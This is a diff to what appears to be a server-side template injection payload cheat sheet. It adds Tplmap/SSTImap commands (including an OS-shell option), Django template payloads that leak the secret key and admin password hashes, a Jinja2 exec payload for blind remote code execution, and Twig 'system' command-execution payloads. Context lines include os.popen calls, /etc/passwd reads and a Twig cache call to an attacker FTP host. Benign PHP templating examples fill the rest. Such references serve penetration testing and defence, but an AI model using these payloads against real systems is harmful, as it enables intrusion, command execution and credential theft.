@@ -15,7 +15,7 @@
     - [Expression Language EL - Basic injection](#expression-language-el---basic-injection)
     - [Expression Language EL - One-Liner injections not including code execution](#expression-language-el---one-liner-injections-not-including-code-execution)
     - [Expression Language EL - Code Execution](#expression-language-el---code-execution)
-  - [Freemarker](#freemarker)
+  - [Java - Freemarker](#freemarker)
     - [Freemarker - Basic injection](#freemarker---basic-injection)
     - [Freemarker - Read File](#freemarker---read-file)
     - [Freemarker - Code execution](#freemarker---code-execution)
@@ -26,14 +26,15 @@
     - [Groovy - HTTP request:](#groovy---http-request)
     - [Groovy - Command Execution](#groovy---command-execution)
     - [Groovy - Sandbox Bypass](#groovy---sandbox-bypass)
-  - [Handlebars](#handlebars)
+  - [JavaScript - Handlebars](#handlebars)
     - [Handlebars - Command Execution](#handlebars---command-execution)
   - [Jade / Codepen](#jade--codepen)
   - [Java](#java)
     - [Java - Basic injection](#java---basic-injection)
     - [Java - Retrieve the system’s environment variables](#java---retrieve-the-systems-environment-variables)
     - [Java - Retrieve /etc/passwd](#java---retrieve-etcpasswd)
-  - [Jinja2](#jinja2)
+  - [Django Template](#django-template)
+  - [Python - Jinja2](#jinja2)
     - [Jinja2 - Basic injection](#jinja2---basic-injection)
     - [Jinja2 - Template format](#jinja2---template-format)
     - [Jinja2 - Debug Statement](#jinja2---debug-statement)
@@ -42,21 +43,22 @@
     - [Jinja2 - Read remote file](#jinja2---read-remote-file)
     - [Jinja2 - Write into remote file](#jinja2---write-into-remote-file)
     - [Jinja2 - Remote Code Execution](#jinja2---remote-code-execution)
+      - [Forcing output on blind RCE](#jinja2---forcing-output-on-blind-rce)
       - [Exploit the SSTI by calling os.popen().read()](#exploit-the-ssti-by-calling-ospopenread)
       - [Exploit the SSTI by calling subprocess.Popen](#exploit-the-ssti-by-calling-subprocesspopen)
       - [Exploit the SSTI by calling Popen without guessing the offset](#exploit-the-ssti-by-calling-popen-without-guessing-the-offset)
       - [Exploit the SSTI by writing an evil config file.](#exploit-the-ssti-by-writing-an-evil-config-file)
     - [Jinja2 - Filter bypass](#jinja2---filter-bypass)
-  - [Jinjava](#jinjava)
+  - [Java - Jinjava](#jinjava)
     - [Jinjava - Basic injection](#jinjava---basic-injection)
     - [Jinjava - Command execution](#jinjava---command-execution)
-  - [Lessjs](#lessjs)
+  - [JavaScript - Lessjs](#lessjs)
     - [Lessjs - SSRF / LFI](#lessjs---ssrf--lfi)
     - [Lessjs < v3 - Command Execution](#lessjs--v3---command-execution)
     - [Plugins](#plugins)
-  - [Mako](#mako)
+  - [Python - Mako](#mako)
     - [Direct access to os from TemplateNamespace:](#direct-access-to-os-from-templatenamespace)
-  - [Pebble](#pebble)
+  - [Java - Pebble](#pebble)
     - [Pebble - Basic injection](#pebble---basic-injection)
     - [Pebble - Code execution](#pebble---code-execution)
   - [Ruby](#ruby)
@@ -64,24 +66,40 @@
     - [Ruby - Retrieve /etc/passwd](#ruby---retrieve-etcpasswd)
     - [Ruby - List files and directories](#ruby---list-files-and-directories)
     - [Ruby - Code execution](#ruby---code-execution)
-  - [Smarty](#smarty)
-  - [Twig](#twig)
+  - [PHP - Smarty](#smarty)
+  - [PHP - Twig](#twig)
     - [Twig - Basic injection](#twig---basic-injection)
     - [Twig - Template format](#twig---template-format)
     - [Twig - Arbitrary File Reading](#twig---arbitrary-file-reading)
     - [Twig - Code execution](#twig---code-execution)
-  - [Velocity](#velocity)
+  - [Java - Velocity](#velocity)
+  - [PHP - patTemplate](#pattemplate)
+  - [PHP - PHPlib](#phplib-and-html_template_phplib)
+  - [PHP - Plates](#plates)
   - [References](#references)
 
 ## Tools
 
-Recommended tool: [Tplmap](https://github.com/epinna/tplmap)
+Recommended tools: 
+
+[Tplmap](https://github.com/epinna/tplmap) - Server-Side Template Injection and Code Injection Detection and Exploitation Tool
+
 e.g:
 
 ```powershell
 python2.7 ./tplmap.py -u 'http://www.target.com/page?name=John*' --os-shell
 python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=*&comment=supercomment&link"
 python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=InjectHere*&comment=A&link" --level 5 -e jade
+```
+
+[SSTImap](https://github.com/vladko312/SSTImap) - Automatic SSTI detection tool with interactive interface based on [Tplmap](https://github.com/epinna/tplmap)
+
+e.g:
+
+```powershell
+python3 ./sstimap.py -u 'https://example.com/page?name=John' -s
+python3 ./sstimap.py -u 'https://example.com/page?name=Vulnerable*&message=My_message' -l 5 -e jade
+python3 ./sstimap.py -i -A -m POST -l 5 -H 'Authorization: Basic bG9naW46c2VjcmV0X3Bhc3N3b3Jk'
 ```
 
 ## Methodology
@@ -311,6 +329,7 @@ ${ new groovy.lang.GroovyClassLoader().parseClass("@groovy.transform.ASTTest(val
 ## Java
 
 ### Java - Basic injection
+> Multiple variable expressions can be used, if `${...}` doesn't work try `#{...}`, `*{...}`, `@{...}` or `~{...}`.
 
 ```java
 ${7*7}
@@ -335,6 +354,67 @@ ${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().ex
 ```
 
 ---
+
+## Django Templates
+
+Django template language supports 2 rendering engines by default: Django Templates (DT) and Jinja2. Django Templates is much simpler engine. It does not allow calling of passed object functions and impact of SSTI in DT is often less severe than in Jinja2.
+
+### Detection
+
+
+```python
+{% csrf_token %} # Causes error with Jinja2
+{{ 7*7 }}  # Error with Django Templates
+ih0vr{{364|add:733}}d121r # Burp Payload -> ih0vr1097d121r
+```
+
+### Django Templates for post-exploitation
+
+```python
+# Variables
+{{ variable }}
+{{ variable.attr }}
+
+# Filters
+{{ value|length }}
+
+# Tags
+{% csrf_token %}
+```
+
+### Cross-site scripting
+
+```python
+{{ '<script>alert(3)</script>' }}
+{{ '<script>alert(3)</script>' | safe }}
+```
+
+### Debug information leak
+
+```python
+{% debug %}
+```
+
+### Leaking app’s Secret Key
+
+```python
+{{ messages.storages.0.signer.key }}
+```
+
+### Admin Site URL leak
+
+
+```
+{% include 'admin/base.html' %}
+```
+
+### Admin username and password hash leak
+
+
+```
+{% load log %}{% get_admin_log 10 as log %}{% for e in log %}
+{{e.user.get_username}} : {{e.user.password}}{% endfor %}
+```
 
 ## Jinja2
 
@@ -417,15 +497,30 @@ Listen for connection
 nc -lnvp 8000
 ```
 
+#### Jinja2 - Forcing output on blind RCE
+
+You can import Flask functions to return an output from the vulnerable page.
+
+```py
+{{
+x.__init__.__builtins__.exec("from flask import current_app, after_this_request
+@after_this_request
+def hook(*args, **kwargs):
+    from flask import make_response
+    r = make_response('Powned')
+    return r
+")
+}}
+```
+
+
 #### Exploit the SSTI by calling os.popen().read()
 
 These payloads are context-free, and do not require anything, except being in a jinja2 Template object:
 
 ```python
 {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
-
 {{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}
-
 {{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }}
 ```
 
@@ -433,9 +528,7 @@ We can use these shorter payloads (this is the shorter payloads known yet):
 
 ```python
 {{ cycler.__init__.__globals__.os.popen('id').read() }}
-
 {{ joiner.__init__.__globals__.os.popen('id').read() }}
-
 {{ namespace.__init__.__globals__.os.popen('id').read() }}
 ```
 
@@ -829,6 +922,9 @@ $output = $twig > render (
 {{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}
 {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
 {{['id']|filter('system')}}
+{{[0]|reduce('system','id')}}
+{{['id']|map('system')|join}}
+{{['id',1]|sort('system')|join}}
 {{['cat\x20/etc/passwd']|filter('system')}}
 {{['cat$IFS/etc/passwd']|filter('system')}}
 ```
@@ -866,6 +962,126 @@ $str.valueOf($chr.toChars($out.read()))
 
 ---
 
+## patTemplate
+
+> [patTemplate](https://github.com/wernerwa/pat-template) non-compiling PHP templating engine, that uses XML tags to divide a document into different parts
+
+```xml
+<patTemplate:tmpl name="page">
+  This is the main page.
+  <patTemplate:tmpl name="foo">
+    It contains another template.
+  </patTemplate:tmpl>
+  <patTemplate:tmpl name="hello">
+    Hello {NAME}.<br/>
+  </patTemplate:tmpl>
+</patTemplate:tmpl>
+```
+
+---
+
+## PHPlib and HTML_Template_PHPLIB
+
+[HTML_Template_PHPLIB](https://github.com/pear/HTML_Template_PHPLIB) is the same as PHPlib but ported to Pear.
+
+`authors.tpl`
+
+```html
+<html>
+ <head><title>{PAGE_TITLE}</title></head>
+ <body>
+  <table>
+   <caption>Authors</caption>
+   <thead>
+    <tr><th>Name</th><th>Email</th></tr>
+   </thead>
+   <tfoot>
+    <tr><td colspan="2">{NUM_AUTHORS}</td></tr>
+   </tfoot>
+   <tbody>
+<!-- BEGIN authorline -->
+    <tr><td>{AUTHOR_NAME}</td><td>{AUTHOR_EMAIL}</td></tr>
+<!-- END authorline -->
+   </tbody>
+  </table>
+ </body>
+</html>
+```
+
+`authors.php`
+
+```php
+<?php
+//we want to display this author list
+$authors = array(
+    'Christian Weiske'  => 'cweiske@php.net',
+    'Bjoern Schotte'     => 'schotte@mayflower.de'
+);
+
+require_once 'HTML/Template/PHPLIB.php';
+//create template object
+$t =& new HTML_Template_PHPLIB(dirname(__FILE__), 'keep');
+//load file
+$t->setFile('authors', 'authors.tpl');
+//set block
+$t->setBlock('authors', 'authorline', 'authorline_ref');
+
+//set some variables
+$t->setVar('NUM_AUTHORS', count($authors));
+$t->setVar('PAGE_TITLE', 'Code authors as of ' . date('Y-m-d'));
+
+//display the authors
+foreach ($authors as $name => $email) {
+    $t->setVar('AUTHOR_NAME', $name);
+    $t->setVar('AUTHOR_EMAIL', $email);
+    $t->parse('authorline_ref', 'authorline', true);
+}
+
+//finish and echo
+echo $t->finish($t->parse('OUT', 'authors'));
+?>
+```
+
+---
+
+## Plates
+
+Plates is inspired by Twig but a native PHP template engine instead of a compiled template engine.
+
+controller:
+
+```php
+// Create new Plates instance
+$templates = new League\Plates\Engine('/path/to/templates');
+
+// Render a template
+echo $templates->render('profile', ['name' => 'Jonathan']);
+```
+
+page template:
+
+```php
+<?php $this->layout('template', ['title' => 'User Profile']) ?>
+
+<h1>User Profile</h1>
+<p>Hello, <?=$this->e($name)?></p>
+```
+
+layout template:
+
+```php
+<html>
+  <head>
+    <title><?=$this->e($title)?></title>
+  </head>
+  <body>
+    <?=$this->section('content')?>
+  </body>
+</html>
+```
+
+---
+
 ## References
 
 * [https://nvisium.com/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii/](https://nvisium.com/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii/)
@@ -889,3 +1105,5 @@ $str.valueOf($chr.toChars($out.read()))
 * [Lab: Server-side template injection in an unknown language with a documented exploit](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit)
 * [Exploiting Less.js to Achieve RCE](https://www.softwaresecured.com/exploiting-less-js/)
 * [A Pentester's Guide to Server Side Template Injection (SSTI)](https://www.cobalt.io/blog/a-pentesters-guide-to-server-side-template-injection-ssti)
+* [Django Templates Server-Side Template Injection](https://lifars.com/wp-content/uploads/2021/06/Django-Templates-Server-Side-Template-Injection-v1.0.pdf)
+* [#HITB2022SIN #LAB Template Injection On Hardened Targets - Lucas 'BitK' Philippe](https://youtu.be/M0b_KA0OMFw)
